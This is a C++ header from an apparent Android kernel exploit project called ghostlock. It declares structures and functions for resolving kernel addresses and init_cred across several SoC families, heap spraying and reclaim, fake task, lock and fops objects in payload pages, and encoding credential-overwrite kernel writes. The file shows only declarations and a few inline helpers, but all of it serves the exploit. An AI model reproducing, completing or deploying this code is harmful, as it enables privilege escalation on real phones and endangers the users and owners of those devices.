/**
 * @file memory.h
 * @brief 43499 核心的按用途头（由 core.cpp 拆分，声明/内联逐字保留）。
 */
#ifndef GHOSTLOCK_CORE_MEMORY_H
#define GHOSTLOCK_CORE_MEMORY_H

#include "target.h"
#include "payload_encode.h"
#include "support.h"

namespace ghostlock::profile { class TargetProfile; }

/* ==== memory/address_space.h ==== */
#ifndef GHOSTLOCK_ADDRESS_SPACE_H
#define GHOSTLOCK_ADDRESS_SPACE_H

#include <optional>

#include <cstdint>

namespace ghostlock::memory {
    enum class SocFamily : int32_t {
        Qcom = 0,
        Mtk,
        Xring,
        Google,
    };

    /* Addresses derived once from an immutable target profile and the device SoC.
 * This is the authoritative input for image-to-direct-map translation. */
    struct ResolvedAddresses {
        SocFamily soc;
        target::KernelAddress<target::PhysicalAddressDomain> kernel_phys_load;
        /* DRAM base (linear-map PHYS_OFFSET). Defaults to the compiled
         * P0_PHYS_OFFSET; a profile may override it via kernel_phys_offset. */
        uintptr_t phys_offset = 0;
        target::KernelAddress<target::ImageAddressDomain> init_cred_image;

        int32_t init(const ghostlock::profile::TargetProfile *profile);

        int32_t init_for_soc(const ghostlock::profile::TargetProfile *profile, SocFamily family);

        uintptr_t data_alias(uintptr_t image_addr) const;

        std::optional<target::KernelAddress<target::DirectMapAddressDomain> > data_alias_checked(
            target::KernelAddress<target::ImageAddressDomain> image_address) const noexcept;

        [[nodiscard]] uint64_t phys_load() const {
            return kernel_phys_load.value();
        }

        [[nodiscard]] uintptr_t init_cred_image_addr() const {
            return init_cred_image.value();
        }

        [[nodiscard]] const char *soc_name(const ghostlock::profile::TargetProfile *profile) const;
    };
} // namespace ghostlock::memory

#endif
/* ==== memory/heap_context.h ==== */
#ifndef HEAP_CONTEXT_H
#define HEAP_CONTEXT_H

#include <array>
#include <cstddef>
#include <cstdint>
#include <sys/types.h>

#include <memory>
#include <type_traits>
#include <vector>



namespace ghostlock::memory {
    /* Owns the per-attempt mm-shaping child pid and memfd arrays. The vectors free
 * their storage on destruction, but they never kill a child or close a memfd:
 * a forked helper that reaches exit() must not release the parent's resources.
 * Release stays explicit through close_ctx_memfds()/free_ctx_storage(). */
    struct MmContextSet {
        std::vector<pid_t> childs;
        std::vector<int32_t> memfds;
    };
} // namespace ghostlock::memory

namespace ghostlock::memory {
    enum class PayloadPageState : int32_t {
        Empty = 0,
        Current,
        Prebuilt,
        Quarantined,
    };

    struct ReclaimPair {
        std::array<int32_t, 2> fd;
    };

    struct PayloadPage {
        uintptr_t base;
        uintptr_t last_mm_struct;
        uintptr_t fake_lock;
        uintptr_t fake_w0;
        uintptr_t fake_task;
        uintptr_t fake_parent;
        uintptr_t fake_right;
        uintptr_t fake_left;
        uintptr_t fake_fops;
        ReclaimPair reclaim;
        PayloadPageState state;
        /* Move-only owner of one payload page and its reclaim socket pair.
     *
     * There is deliberately no destructor: a page whose fds may still be
     * referenced by the kernel must never be released by scope exit. Use
     * destroy() for the explicit release and move_to() to transfer ownership.
     * A moved-from page is left empty; the fds travel with the destination. */
        PayloadPage() noexcept;

        PayloadPage(const PayloadPage &) = delete;

        PayloadPage &operator=(const PayloadPage &) = delete;

        PayloadPage(PayloadPage &&other) noexcept;

        PayloadPage &operator=(PayloadPage &&) = delete;

        [[nodiscard]] bool has_reclaim() const noexcept;

        void destroy() noexcept;

        [[nodiscard]] bool move_to(PayloadPage &destination,
                                   PayloadPageState destination_state) noexcept;
    };

    static_assert(std::is_standard_layout_v<PayloadPage>);
    static_assert(!std::is_copy_constructible_v<PayloadPage>);
    static_assert(!std::is_copy_assignable_v<PayloadPage>);
    static_assert(std::is_move_constructible_v<PayloadPage>);
    /* No implicit release on scope exit: the destructor stays trivial. */
    static_assert(std::is_trivially_destructible_v<PayloadPage>);

    struct HeapContext {
        void *snitch;  /* KernelSnitch opaque 句柄（见 core/ks_bridge.h） */
        size_t mm_objs_per_slab;
        std::unique_ptr<unsigned char[]> skb_buffer;
        MmContextSet prepare;
        MmContextSet spray;
        MmContextSet pre;
        MmContextSet post;
        /* Owns the KernelSnitch collision helper until it exits; mark_reaped()
     * records the waitpid() the spray path performs, so scope exit never
     * signals a pid twice. */
        ghostlock::support::ChildProcess leak_child;
        ghostlock::support::UniqueFd leak_memfd;
        PayloadPage current;
        PayloadPage prebuilt;
        PayloadPage quarantine;

        void init();
    };

    void close_ctx_memfds(MmContextSet *ctx);

    void free_ctx_storage(MmContextSet *ctx);
} // namespace ghostlock::memory


#endif
/* ==== memory/payload_builder.h ==== */
#ifndef PAYLOAD_BUILDER_H
#define PAYLOAD_BUILDER_H

#include <cstddef>
#include <cstdint>


#include <cstddef>
#include <cstdint>
#include <span>
#include <type_traits>

namespace ghostlock::memory {
    /* Immutable description of one kernel write. `preserve_child` selects the
 * one-child erase layout; false selects the leaf/zero layout. */
    enum class WriteMode : int32_t {
        Disabled = 0,
        Zero = 1,
        Credential = 2,
    };

    struct WriteRequest final {
        std::uintptr_t target = 0;
        WriteMode mode = WriteMode::Disabled;
        bool preserve_child = false;

        [[nodiscard]] static constexpr WriteRequest make(std::uintptr_t target,
                                                         WriteMode mode,
                                                         bool leaf) noexcept {
            return WriteRequest{target, mode, !leaf};
        }
    };

    struct PayloadWriteLayout final {
        std::uintptr_t parent = 0;
        std::uintptr_t right = 0;
        std::uintptr_t left = 0;
        std::uintptr_t fops = 0;
        bool needs_credential_copy = false;
    };

    static_assert(std::is_standard_layout_v<WriteRequest>);
    static_assert(std::is_trivially_copyable_v<WriteRequest>);
    static_assert(offsetof(WriteRequest, target) == 0);
    static_assert(offsetof(WriteRequest, mode) == sizeof(std::uintptr_t));
    static_assert(std::is_standard_layout_v<PayloadWriteLayout>);
    static_assert(std::is_trivially_copyable_v<PayloadWriteLayout>);

    /* Fixed payload fragment sizes shared by the encoders and their callers. */
    inline constexpr std::size_t kCompactWaiterBytes = 0x30;

    /* Bounds-checked encoders. They return false without modifying memory when
 * the destination cannot contain every field required by the layout. */
    [[nodiscard]] bool encode_compact_waiter(
        std::span<std::byte> waiter, const WriteRequest &request,
        const PayloadWriteLayout &layout) noexcept;

    /* encode_multicast_waiter 的声明与内联定义都在 payload_encode.h（host 可编）。 */
} // namespace ghostlock::memory

namespace ghostlock::memory {
    /* Resolve the request-dependent words shared by the three route encoders. */
    PayloadWriteLayout payload_write_layout(
        const WriteRequest *request, uintptr_t page_base,
        uintptr_t default_fops, uintptr_t credential_fops,
        uintptr_t init_cred_alias);

    /* Encode the route-neutral compact waiter write arm. Value writes always use
 * {pc=value,right=0,left=target}; leaf writes use {pc=target-8,0,0}. */
    void build_compact_waiter_payload(
        unsigned char *waiter, const WriteRequest *request,
        const PayloadWriteLayout *layout);

    int32_t payload_write_layout_matches_request(
        const WriteRequest *request, const PayloadWriteLayout *layout);

    int32_t payload_write_layout_accepts_page(
        const WriteRequest *request, const PayloadWriteLayout *layout);

    void build_multicast_waiter_payload(
        unsigned char *buffer, size_t waiter_offset, size_t task_offset,
        size_t lock_offset, uintptr_t fake_task, uintptr_t fake_lock);

    /* Fixed request/layout vectors, including the upstream unified compact arm. */
    int32_t payload_builder_fixed_vector_test(void);
} // namespace ghostlock::memory

#endif

#endif // GHOSTLOCK_CORE_MEMORY_H
